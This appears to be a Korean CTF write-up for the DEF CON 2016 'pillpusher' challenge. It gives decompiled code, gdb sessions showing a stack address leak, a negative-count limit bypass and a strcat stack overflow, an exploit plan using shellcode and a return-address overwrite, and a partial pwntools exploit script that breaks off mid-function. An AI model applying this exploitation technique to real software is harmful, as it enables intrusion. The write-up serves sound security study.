---
title: "Pwnable) pillpusher"
sidebar_position: 1
---
## **Information**

### **Description**

```
D00d you gotta fix for me?

[Download](http://download.quals.shallweplayaga.me/a3b929dac1a7ca27fe5474bae0432262/pillpusher)

pillpusher\_a3b929dac1a7ca27fe5474bae0432262.quals.shallweplayaga.me:43868
```

### **File**

* [pillpusher](/attachments/1147390/1147389.bin)

### **Source Code**

* <https://github.com/legitbs/quals-2016/tree/master/pillpusher>

## **Writeup**

### File information

```sh title="Binary Information"
lazenca0x0@ubuntu:~/CTF/DEFCON2016/Pwnable/glados$ file ./glados
./glados: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), statically linked, stripped
lazenca0x0@ubuntu:~/CTF/DEFCON2016/Pwnable/glados$ checksec -f ./glados
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH  FORTIFY Fortified Fortifiable  FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No  0       0   ./glados
```

* 해당 프로그램을 실행 하면 다음과 같은 기능 목록을 확인할 수 있습니다.

```sh title="Program Menu"
autolycos@ubuntu:~/CTF/DEFCON2016/Pwnable/pillpusher$ ./pillpusher 
1) Pharmacy Menu 
2) Pill Menu 
3) Pharmacist Menu 
4) Patient Menu 
5) Scrip Menu 
6) Exit
```

### **Binary analysis**

#### **AddPill()**

* AddPill() 함수는 다음과 같은 기능을 합니다.
  + 사용자로부터 필요한 데이터들을 입력 받고 있습니다.
  + 최대 256개의 문자를 입력 받을 수 있습니다.
  + 입력받은 pillname은 checkPillList() 함수를 이용해 기존에 등록된 값인지 확인합니다.
  + 유저로 부터 입력받은 pillname 문자열은 해당 문자열의 길이 만큼 pillInfo→pillName 영역에 복사됩니다.
  + 여기에서 stack addresss가 leak되는 취약성이 있습니다.

```c title="AddPill() Function"
__int64 AddPill()
{
  unsigned __int64 v0; // rt0@1
  __int64 result; // rax@2
  struct_v4 *newPill; // rbx@9 MAPDST
  char tmp[256]; // [rsp-130h] [rbp-130h]@1
  unsigned int len; // [rsp-28h] [rbp-28h]@1 MAPDST
  int v9; // [rsp-24h] [rbp-24h]@1
  unsigned __int64 v10; // [rsp-8h] [rbp-8h]@1

  v0 = __getcallerseflags();
  v10 = v0;
  v9 = 0;
  len = 0;
  memset(tmp, 0LL, 256LL);
  printf("Pill Name: ");
  read(0LL, tmp, 10LL, 256LL);
  if ( (unsigned int)CheckPillList(tmp) )
  {
    result = printf("No home slice it is already there\n");
  }
  else
  {
    newPill = (struct_v4 *)malloc(64LL);
    len = strlen(tmp);
    if ( !newPill )
    {
      printf("Done gone and screwed up.\n");
      exit();
    }
    memset(newPill, 0LL, 64LL);
    newPill->name = malloc(len + 1);
    if ( !newPill->name )
    {
      printf("Didn't work\n");
      exit();
    }
    memset(newPill->name, 0LL, len + 1);
    len = strlen(tmp);
    memcpy(newPill->name, tmp, len);
    printf("Dosage: ");
    memset(tmp, 0LL, 256LL);
    len = 0;
    read(0LL, tmp, 10LL, 256LL);
    newPill->dosage = atoi(tmp);
    printf("Schedule: ");
    memset(tmp, 0LL, 256LL);
    read(0LL, tmp, 10LL, 256LL);
    newPill->schedule = atoi(tmp);
    printf("List what this pill treats. Blank line to quit.\n");
    while ( 1 )
    {
      printf(": ");
      memset(tmp, 0LL, 256LL);
      len = read(0LL, tmp, 10LL, 256LL);
      if ( !len )
        break;
      addPillTreats(newPill, tmp, len);
    }
    printf("List other pills this interacts with. Blank line to quit.\n");
    while ( 1 )
    {
      printf(": ");
      memset(tmp, 0LL, 256LL);
      if ( !(unsigned int)read(0LL, tmp, 10LL, 256LL) )
        break;
      addPillInteracts(newPill, tmp);
    }
    printf("List all side effects. Blank line to quit.\n");
    while ( 1 )
    {
      printf(": ");
      memset(tmp, 0LL, 256LL);
      if ( !(unsigned int)read(0LL, tmp, 10LL, 256LL) )
        break;
      addPillSideEffects(newPill, tmp);
    }
    result = addPill(newPill);
  }
  __writeeflags(v10);
  return result;
}
```

* 다음과 같이 디버깅을 통해 addresss leak에 대한 취약성을 확인해보겠습니다.
  + "tmp"의 메모리 영역은 0x7fffffffe090 ~ 0x7fffffffe190입니다.
    - 0x7fffffffe090 + 0x100(256) = 0x7fffffffe190
  + 그리고 0x7fffffffe190 영역에 stack addresss가 저장되어 있습니다.
  + 즉, 사용자가 "tmp"영역에 256개의 문자를 저장하면 stack addresss를 얻을 수 있습니다.
    - "tmp"와 0x7fffffffe190 영역 사이에 공백이 없으면 프로그램은 두 영역을 하나의 문자열로 인식합니다.

```sh title="AddPill Addresss Leak"
autolycos@ubuntu:~/Documents/DEFCON 2016/Pwnable$ gdb -q ./pillpusher 
Reading symbols from ./pillpusher...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) b *0x0400C6E
Breakpoint 1 at 0x400c6e
(gdb) r
Starting program: /home/autolycos/Documents/DEFCON 2016/Pwnable/pillpusher 
1) Pharmacy Menu
2) Pill Menu
3) Pharmacist Menu
4) Patient Menu
5) Scrip Menu
6) Exit
-> 2
1) Add a Pill
2) Random Pill
3) List Pills
4) Modify Pill
5) "Lose" Pills
6) Leave Menu
-> 1
Pill Name: 
Breakpoint 1, 0x0000000000400c6e in ?? ()
(gdb) x/2i $rip
=> 0x400c6e:	call   0x40018a
   0x400c73:	lea    rax,[rbp-0x120]
(gdb) i r rdi
rdi            0x0	0
(gdb) i r rsi
rsi            0x7fffffffe090	140737488347280
(gdb) x/34gx 0x7fffffffe090
0x7fffffffe090:	0x0000000000000000	0x0000000000000000
0x7fffffffe0a0:	0x0000000000000000	0x0000000000000000
0x7fffffffe0b0:	0x0000000000000000	0x0000000000000000
0x7fffffffe0c0:	0x0000000000000000	0x0000000000000000
0x7fffffffe0d0:	0x0000000000000000	0x0000000000000000
0x7fffffffe0e0:	0x0000000000000000	0x0000000000000000
0x7fffffffe0f0:	0x0000000000000000	0x0000000000000000
0x7fffffffe100:	0x0000000000000000	0x0000000000000000
0x7fffffffe110:	0x0000000000000000	0x0000000000000000
0x7fffffffe120:	0x0000000000000000	0x0000000000000000
0x7fffffffe130:	0x0000000000000000	0x0000000000000000
0x7fffffffe140:	0x0000000000000000	0x0000000000000000
0x7fffffffe150:	0x0000000000000000	0x0000000000000000
0x7fffffffe160:	0x0000000000000000	0x0000000000000000
0x7fffffffe170:	0x0000000000000000	0x0000000000000000
0x7fffffffe180:	0x0000000000000000	0x0000000000000000
0x7fffffffe190:	0x00007fffffffe1c8	0x0000000000000000
(gdb)
```

* 다음과 같이 "Side Effects: ", "Interactions: "에서도 stack addresss를 출력할 수 있습니다.

```sh title="Side Effects Addresss Leak"
Name: AAAAAAAAAA ...생략 ... AAAAAA`x)f
	Dosage: 0
	Schedule: 0
	Treats: 
		1) AAAAAAAAAA ...생략 ... AAAAAA
	Side Effects: 
		1) AAAAAAAAAA ...생략 ... AAAAAA`x)f
	Interactions: 
		1) AAAAAAAAAA ...생략 ... AAAAAA`x)f
```

### AddScrip()

* "Add Scrip"기능을 이용하기 위해서는 다음과 같이 사전에 필요한 정보를 저장해야합니다.

```sh title="Add a Pill"
autolycos@ubuntu:~/CTF/DEFCON2016/Pwnable/pillpusher$ ./pillpusher
1) Pharmacy Menu
2) Pill Menu
3) Pharmacist Menu
4) Patient Menu
5) Scrip Menu
6) Exit
-> 2
1) Add a Pill
2) Random Pill
3) List Pills
4) Modify Pill
5) "Lose" Pills
6) Leave Menu
-> 1
Pill Name: Vitamin1
Dosage: 1
Schedule: 1
List what this pill treats. Blank line to quit.
: AAAA
:
List other pills this interacts with. Blank line to quit.
: BBBB
:
List all side effects. Blank line to quit.
: CCCC
:
1) Add a Pill
2) Random Pill
3) List Pills
4) Modify Pill
5) "Lose" Pills
6) Leave Menu
-> 1
Pill Name: Vitamin2
Dosage: 1
Schedule: 1
List what this pill treats. Blank line to quit.
: AAAA
:  
List other pills this interacts with. Blank line to quit.
: BBBB
:
List all side effects. Blank line to quit.
: CCCC
:
1) Add a Pill
2) Random Pill
3) List Pills
4) Modify Pill
5) "Lose" Pills
6) Leave Menu
-> 6
```

```sh title="Add Pharmacist"
1) Pharmacy Menu
2) Pill Menu
3) Pharmacist Menu
4) Patient Menu
5) Scrip Menu
6) Exit
-> 3
1) Add Pharmacist
2) Remove Pharmacist
3) Update Pharmacist
4) List Pharmacists
5) Back up
-> 1
Name: Sam
Certification Level: 1
1) Add Pharmacist
2) Remove Pharmacist
3) Update Pharmacist
4) List Pharmacists
5) Back up
-> 5
```

```sh title="Add Pharmacy"
1) Pharmacy Menu
2) Pill Menu
3) Pharmacist Menu
4) Patient Menu
5) Scrip Menu
6) Exit
-> 1
1) Create Pharmacy
2) Update Pharmacy
3) Delete Pharmacy
4) List Pharmacies
5) Go up
-> 1
What is the "Pharmacy"'s name? Lazenca
Name: Vitamin1
    Dosage: 1
    Schedule: 1
    Treats:
        1) AAAA
    Side Effects:
        1) CCCC
    Interactions:
        1) BBBB
 
Name: Vitamin2
    Dosage: 1
    Schedule: 1
    Treats:
        1) AAAA
    Side Effects:
        1) CCCC
    Interactions:
        1) BBBB
 
Add pills. Blank line to quit.
: Vitamin1
: Vitamin2
:
1) Sam -- 1
 
Add staff. Blank line to quit.
: Sam
:
1) Create Pharmacy
2) Update Pharmacy
3) Delete Pharmacy
4) List Pharmacies
5) Go up
-> 5
```

```sh title="Add Patient"
1) Pharmacy Menu
2) Pill Menu
3) Pharmacist Menu
4) Patient Menu
5) Scrip Menu
6) Exit
-> 4
1) Add Patient
2) Delete Patient
3) Update Patient
4) List Patients
5) Leave menu
-> 1
Patient name: min
Would you like to enter symptoms? (Y/n): Y
: DDDD
:
1) Add Patient
2) Delete Patient
3) Update Patient
4) List Patients
5) Leave menu
-> 5
```

```sh title="Select Pharmacy"
1) Pharmacy Menu
2) Pill Menu
3) Pharmacist Menu
4) Patient Menu
5) Scrip Menu
6) Exit
-> 5
Current Pharmacy: None
Current Pharmacist: None
Current Patient: None
1) Select a Pharmacy
2) Select a Pharmacist
3) Select a Patient
4) Add Scrip
5) Leave
-> 1
Name: Lazenca
Stock:
    Vitamin1
    Vitamin2
Staff:
    Sam
 
: Lazenca
Current Pharmacy: Lazenca
Current Pharmacist: None
Current Patient: None
1) Select a Pharmacy
2) Select a Pharmacist
3) Select a Patient
4) Add Scrip
5) Leave
-> 2
1) Sam
: 1
Current Pharmacy: Lazenca
Current Pharmacist: Sam
Current Patient: None
1) Select a Pharmacy
2) Select a Pharmacist
3) Select a Patient
4) Add Scrip
5) Leave
-> 3
Name: min
Symptoms:
    1) DDDD
: min
Current Pharmacy: Lazenca
Current Pharmacist: Sam
Current Patient: min
1) Select a Pharmacy
2) Select a Pharmacist
3) Select a Patient
4) Add Scrip
5) Leave
->
```

* 해당 함수는 다음과 같은 기능을 합니다.
  + 사전에 선택한 약국, 약사, 환자 정보를 인자값으로 전달 받습니다.
  + 사용자로 부터 다음 질문에 대한 값을 입력 받습니다.
    - "How many pills to add"
    - "Add pill:"
  + 추가할 후 있는 약의 갯수는 2개로 제한하고 있습니다.  
    - 하지만 음수(-)를 이용해 더 많은 약을 추가할 수 있습니다.

```c title="AddScrip Vulnerability"
void __usercall AddScrip(struct_patient *patient@<rdx>, __int64 a2@<rbp>, __int64 pharmacy@<rdi>, __int64 pharmacist@<rsi>)
{
  unsigned __int64 v4; // rt0@1
  int lenScript; // eax@18 MAPDST
  unsigned int len; // eax@18
  char tmp[512]; // [rsp+18h] [rbp-430h]@4
  __int64 status; // [rsp+220h] [rbp-228h]@4
  __int64 extra; // [rsp+228h] [rbp-220h]@4
  __int64 count; // [rsp+230h] [rbp-218h]@4 MAPDST
  char script[512]; // [rsp+238h] [rbp-210h]@7
  unsigned __int64 v17; // [rsp+440h] [rbp-8h]@1

  v4 = __getcallerseflags();
  v17 = v4;
  if ( pharmacy && pharmacist && patient )
  {
    count = 0LL;
    status = 0LL;
    count = 0LL;
    extra = 0LL;
    memset(tmp, 0LL, 512LL);
    printf("How many pills to add: ");
    count = (signed int)UserInputInt(a2, 0);
    if ( count > 2 )
      count = 2LL;
    pharmacist = 0LL;
    memset(script, 0LL, 512LL);
    while ( count )
    {
      listPill((__int64 *)pharmacy);
      printf("Add pill: ");
      status = addPillScript(pharmacy, pharmacist, (__int64)patient, (__int64)script);
      if ( status == 1 )
      {
        --count;
        ++extra;
      }
      else if ( !status )
      {
        break;
      }
    }
    if ( extra > 0 )
    {
      if ( patient->scripts )
        free(patient->scripts);
      lenScript = strlen(script);
      patient->scripts = malloc((unsigned int)(lenScript + 1));
      if ( !patient->scripts )
      {
        printf("Fail\n");
        exit(0LL, pharmacist);
      }
      lenScript = strlen(script);
      memset(patient->scripts, 0LL, (unsigned int)(lenScript + 1));
      len = strlen(script);
      memcpy(patient->scripts, script, len);
    }
  }
  __writeeflags(v17);
}
```

#### **addPillScript()**

* 해당 함수는 다음과 같은 기능을 합니다.
  + 사용자로 부터 추가할 pill의 이름을 입력 받습니다.
  + 추가할 약(pill)의 이름이 사전에 등록되어 있는지 확인합니다.
  + 사용자가 입력한 약의 이름이 사전에 등록되어 있다면 다음과 같이 동작합니다.
    - 해당 약 이름에 대한 길이를 출력합니다.
    - 'script'에 저장된 문자열 뒤에 해당 약 이름을 붙입니다.(strcat() 함수 사용)
  + 취약성은 여기서 발생합니다.
    - "Add pill"의 값으로 2 이상의 값을 입력할 수 있다면, strcat()함수에 의해 Stack Overflow가 발생합니다.

```c title="addPillScript() Vulnerability"
signed __int64 __fastcall addPillScript(pharmacy *pharmacy, __int64 pharmacist, patient *patient, char *__attribute__((__org_arrdim(0,256))) script)
{
  unsigned __int64 v4; // rt0@1
  signed __int64 result; // rax@5
  int j; // eax@31 MAPDST
  char tmp[256]; // [rsp+20h] [rbp-130h]@6
  int v13; // [rsp+120h] [rbp-30h]@1
  pill *pill; // [rsp+128h] [rbp-28h]@1
  __int64 status; // [rsp+130h] [rbp-20h]@1
  int i; // [rsp+13Ch] [rbp-14h]@1
  unsigned __int64 v18; // [rsp+148h] [rbp-8h]@1

  v4 = __getcallerseflags();
  v18 = v4;
  i = 0;
  j = 0;
  status = 0LL;
  pill = 0LL;
  v13 = 0;
  if ( pharmacy && pharmacist && patient && script )
  {
    memset(tmp, 0LL, 256LL);
    if ( (unsigned int)read(0LL, tmp, 10LL, 256LL) )
    {
      for ( i = 0; pharmacy->pill_max > i; ++i )
      {
        if ( pharmacy->stock[i] && !(unsigned int)strncmp(pharmacy->stock[i]->name, tmp, 256LL) )
        {
          printf("strncmp found it.\n");
          pill = pharmacy->stock[i];
          break;
        }
      }
      if ( pill )
      {
        for ( i = 0; patient->symptom_cnt > i && !status; ++i )
        {
          if ( patient->symptoms[i] )
          {
            for ( j = 0; pill->treats_count > j && !status; ++j )
            {
              if ( !(unsigned int)strncmp(patient->symptoms[i], pill->treats[j], 256LL) )
                status = 1LL;
            }
          }
        }
        j = strlen(pill->name);
        printf("Len: %d\n");
        if ( status )
        {
          if ( pill->schedule <= *(_DWORD *)(pharmacist + 8) )
          {
            strcat(script, pill->name);
            script[++j] = 32;
            script[++j] = 32;
            script[++j] = 32;
            script[++j] = 32;
            result = 1LL;
          }
          else
          {
            printf("This doc isn't qualified.\n");
            result = 0LL;
          }
        }
        else
        {
          printf("Pill solves nothing. You pill pusher.\n");
          result = 0LL;
        }
      }
      else
      {
        printf("Invalid\n");
        result = 0LL;
      }
    }
    else
    {
      printf("Blank line.\n");
      result = 0LL;
    }
  }
  else
  {
    result = 0LL;
  }
  __writeeflags(v18);
  return result;
}
```

* 다음은 디버깅을 통해 Overflow를 확인한 내용입니다.
  + 사전에 문자 'A' 256개를 "Pill name"으로 등록합니다.
  + "How many pills to add: "의 값으로 '-1'을 입력합니다.
  + "Add pill"에 등록한 'A' 256개를 입력하면 script 변수에 계속 해당 약의 이름이 이어서 저장되는 것을 확인할 수 있습니다.
  + Stack Overflow 후에 공백을 입력해 addPillScript() 함수를 종료하면 Segmentation fault 발생하게 됩니다.

```sh title="addPillScript Overflow"   
Current Pharmacy: lazenca0x0
Current Pharmacist: lazenca0x0
Current Patient: test
1) Select a Pharmacy
2) Select a Pharmacist
3) Select a Patient
4) Add Scrip
5) Leave
-> 4
How many pills to add: -1

Pills available at: lazenca0x0
	1) AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA????

Add pill: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
strncmp found it.
Len: 262

Breakpoint 1, 0x0000000000407368 in ?? ()
(gdb) i r rdi
rdi            0x7fffffffdea0	140737488346784
(gdb) c
Continuing.

Breakpoint 2, 0x000000000040736d in ?? ()
(gdb) x/34gx 0x7fffffffdea0
0x7fffffffdea0:	0x4141414141414141	0x4141414141414141
0x7fffffffdeb0:	0x4141414141414141	0x4141414141414141

...
0x7fffffffdf80:	0x4141414141414141	0x4141414141414141
0x7fffffffdf90:	0x4141414141414141	0x4141414141414141
0x7fffffffdfa0:	0x00007ffff7ffa008	0x0000000000000000
(gdb) c
Continuing.

Pills available at: lazenca0x0
	1) AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA????

Add pill: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
strncmp found it.
Len: 262

Breakpoint 1, 0x0000000000407368 in ?? ()
(gdb) 
Continuing.
Breakpoint 2, 0x000000000040736d in ?? ()
(gdb) x/70gx 0x7fffffffdea0
0x7fffffffdea0:	0x4141414141414141	0x4141414141414141
0x7fffffffdeb0:	0x4141414141414141	0x4141414141414141

...
0x7fffffffdf90:	0x4141414141414141	0x4141414141414141
0x7fffffffdfa0:	0x20007ffff7ffa008	0x4141414141412020
0x7fffffffdfb0:	0x4141414141414141	0x4141414141414141
0x7fffffffdfc0:	0x4141414141414141	0x4141414141414141

...
0x7fffffffe090:	0x4141414141414141	0x4141414141414141
0x7fffffffe0a0:	0x4141414141414141	0x7ffff7ffa0084141
0x7fffffffe0b0:	0x00000000004076bf	0x0000000074736574
0x7fffffffe0c0:	0x0000000000000000	0x0000000000000000
(gdb) c
Continuing.
Pills available at: lazenca0x0
	1) AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA????

Add pill: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
strncmp found it.
Len: 262

Breakpoint 1, 0x0000000000407368 in ?? ()
(gdb) 
Continuing.
Breakpoint 2, 0x000000000040736d in ?? ()
(gdb) x/100gx 0x7fffffffdea0
0x7fffffffdea0:	0x4141414141414141	0x4141414141414141
0x7fffffffdeb0:	0x4141414141414141	0x4141414141414141

...

0x7fffffffe1a0:	0x4141414141414141	0x4141414141414141
0x7fffffffe1b0:	0xfff7ffa008414141	0x000000040000007f
(gdb) c
Continuing.

Pills available at: lazenca0x0
	1)AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA????

Add pill: 
Blank line.

Program received signal SIGSEGV, Segmentation fault.
0x0000000000407969 in ?? ()
(gdb) bt
#0  0x0000000000407969 in ?? ()
#1  0x41414141414076bf in ?? ()
#2  0x4141414141414141 in ?? ()
#3  0x4141414141414141 in ?? ()
#4  0x4141414141414141 in ?? ()
#5  0x4141414141414141 in ?? ()
#6  0x4141414141414141 in ?? ()
#7  0x4141414141414141 in ?? ()
#8  0x4141414141414141 in ?? ()
#9  0x4141414141414141 in ?? ()
#10 0x4141414141414141 in ?? ()
#11 0x4141414141414141 in ?? ()
#12 0x4141414141414141 in ?? ()
#13 0x4141414141414141 in ?? ()
#14 0x4141414141414141 in ?? ()
#15 0x4141414141414141 in ?? ()
#16 0x4141414141414141 in ?? ()
#17 0x4141414141414141 in ?? ()
#18 0x4141414141414141 in ?? ()
#19 0x4141414141414141 in ?? ()
#20 0x4141414141414141 in ?? ()
#21 0x4141414141414141 in ?? ()
#22 0x4141414141414141 in ?? ()
---Type <return> to continue, or q <return> to quit---
```

### Vulnerability code

#### Stack Addresss Leak

```c title="AddPill Vulnerability"
__int64 AddPill()
{
  ...
  memset(tmp, 0LL, 256LL);
  printf("Pill Name: ");
  read(0LL, tmp, 10LL, 256LL);

  ...
```

#### bypass limite

```c title="AddScrip Vulnerability"
void __usercall AddScrip(struct_patient *patient@<rdx>, __int64 a2@<rbp>, __int64 pharmacy@<rdi>, __int64 pharmacist@<rsi>)
{
	...
    printf("How many pills to add: ");
    count = (signed int)UserInputInt(a2, 0);
    if ( count > 2 )
      count = 2LL;
```

#### Stack Overflow

```c title="addPillScript() Vulnerability"
signed __int64 __fastcall addPillScript(pharmacy *pharmacy, __int64 pharmacist, patient *patient, char *__attribute__((__org_arrdim(0,256))) script)
{
  ...
          if ( pill->schedule <= *(_DWORD *)(pharmacist + 8) )
          {
            strcat(script, pill->name);
            script[++j] = 32;
            script[++j] = 32;
            script[++j] = 32;
            script[++j] = 32;
            result = 1LL;
          }
   ...
```

### Structure of Exploit code

:::note[Description]
1. PillName으로 문자 256개를 입력하여 공격에 사용될 주소 값을 추출합니다.
2. 공격에 필요한 정보를 등록합니다.
   1. shellcode
   2. shellcode가 저장되어 있는 addresss
3. "How many pills to add:" 의 값으로 -1을 입력합니다.
4. Shellcode와 Shellcode가 저장된 주소값을 Pill Name으로 등록합니다.
:::

* The following information is required for an attack:

:::note[Check point]
* Shellcode가 저장되 주소 값 계산 (offset 구하기)
:::

### **Information for attack**

#### Get offset(Shellcode가 저장된 영역 )

* 앞에서 확인했 듯이 "Pill Name"으로 문자 256개를 입력하여 Stack 주소 값을 얻을 수 있습니다.
  + Leaked stack addresss : "0x00007fffffffe2a8"
  + 사용자가 입력한 값이 저장된 영역(0x7fffffffe170)에서 0x138 만큼 떨어져 있습니다.

```sh title="PillName Stack Addresss Leak"
(gdb) b *0x400C82    
Breakpoint 10 at 0x400c82
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/autolycos/CTF/DEFCON2016/Pwnable/pillpusher/pillpusher 
1) Pharmacy Menu
2) Pill Menu
3) Pharmacist Menu
4) Patient Menu
5) Scrip Menu
6) Exit
-> 2
1) Add a Pill
2) Random Pill
3) List Pills
4) Modify Pill
5) "Lose" Pills
6) Leave Menu
-> 1
Pill Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 10, 0x0000000000400c82 in ?? ()
(gdb) x/40gx 0x7fffffffe170
0x7fffffffe170:	0x4141414141414141	0x4141414141414141
0x7fffffffe180:	0x4141414141414141	0x4141414141414141
0x7fffffffe190:	0x4141414141414141	0x4141414141414141
0x7fffffffe1a0:	0x4141414141414141	0x4141414141414141
0x7fffffffe1b0:	0x4141414141414141	0x4141414141414141
0x7fffffffe1c0:	0x4141414141414141	0x4141414141414141
0x7fffffffe1d0:	0x4141414141414141	0x4141414141414141
0x7fffffffe1e0:	0x4141414141414141	0x4141414141414141
0x7fffffffe1f0:	0x4141414141414141	0x4141414141414141
0x7fffffffe200:	0x4141414141414141	0x4141414141414141
0x7fffffffe210:	0x4141414141414141	0x4141414141414141
0x7fffffffe220:	0x4141414141414141	0x4141414141414141
0x7fffffffe230:	0x4141414141414141	0x4141414141414141
0x7fffffffe240:	0x4141414141414141	0x4141414141414141
0x7fffffffe250:	0x4141414141414141	0x4141414141414141
0x7fffffffe260:	0x4141414141414141	0x4141414141414141
0x7fffffffe270:	0x00007fffffffe2a8	0x0000000000000000
0x7fffffffe280:	0x0000000000000031	0x0000000000000000
0x7fffffffe290:	0x00007fffffffe2e0	0x0000000000000293
0x7fffffffe2a0:	0x0000000000403a1f	0x0000000000000032
(gdb) p/x 0x00007fffffffe2a8 - 0x7fffffffe170
$4 = 0x138
```

#### return addresss

* 다음과 같이 Overwrite할 영역을 찾습니다.
  + script 값은 addPill() 함수에서 생성되었기 때문에 addPill() 함수의 ret 명령어에 break point를 설정합니다.
  + return 될 주소가 저장된 영역을 0x7fffffffe0b0 입니다.
  + script 영역으로 부터 528byte 떨어져 있습니다.
    - 0x7fffffffe0b0 - 0x7fffffffdea0 = 528

```sh title="return address"
Breakpoint 4, 0x0000000000407969 in ?? ()
(gdb) x/i $rip
=> 0x407969:	ret    
(gdb) i r rsp
rsp            0x7fffffffe0b0	0x7fffffffe0b0
(gdb) x/gx 0x7fffffffe0b0
0x7fffffffe0b0:	0x41414141414076bf
(gdb) p/x 0x7fffffffe0b0 - 0x7fffffffdea0
$2 = 0x210
(gdb) p/d 0x7fffffffe0b0 - 0x7fffffffdea0
$3 = 528
(gdb)
```

:::note[공격에 사용될 정보]
* Shellcode가 저장되 주소 값 계산 (offset 구하기) : leak Addresss - 0x60
:::

## **Exploit Code**

```python title="Exploit Code"
from pwn import *
 
p = process("./pillpusher")
 
def AddaPill(name):
    p.recvuntil('-> ')
    p.sendline('2')
    p.recvuntil('-> ')
    p.sendline('1')
    p.recvuntil('Pill Name: ')
    p.sendline(name)
    p.recvuntil('Dosage: ')
    p.sendline('1')
    p.recvuntil('Schedule: ')
    p.sendline('1')
    p.recvuntil(':')
    p.sendline('test')
    p.sendline('')
    p.recvuntil(':')
    p.sendline('')
    p.recvuntil(':')
    p.sendline('')
    p.recvuntil('-> ')
    p.sendline('6')
     
def ListPills(name):
    p.recvuntil('-> ')
    p.sendline('2')
    p.recvuntil('-> ')
    p.sendline('3')
    p.recvuntil(pillname)
    addr = p.recvuntil('\n\t').split("\n\t")[0]
    p.recvuntil('-> ')
    p.sendline('6')
    addr = u64(addr + "\x00\x00")
    return addr
 
def AddPharmacist(name):
    p.recvuntil('-> ')
    p.sendline('3')
    p.recvuntil('-> ')
    p.sendline('1')
    p.recvuntil('Name: ')
    p.sendline(name)
    p.recvuntil('Certification Level: ')
    p.sendline('1')
    p.recvuntil('-> ')
    p.sendline('5')
 
def CreatePharmacy(name,pills,staff):
    p.recvuntil('-> ')
    p.sendline('1')
    p.recvuntil('-> ')
    p.sendline('1')
    p.recvuntil('What is the \"Pharmacy\"\'s name? ')
    p.sendline(name)
    for x in pills:
        p.recvuntil(': ')
        p.sendline(x)
    p.recvuntil(': ')
    p.sendline('')
 
    p.recvuntil(': ')
    p.sendline(staff)
    p.sendline('')
 
    p.recvuntil('-> ')
    p.sendline('5')
     
 
def AddPatient(patient):
    p.recvuntil('-> ')
    p.sendline('4')
    p.recvuntil('-> ')
    p.sendline('1')
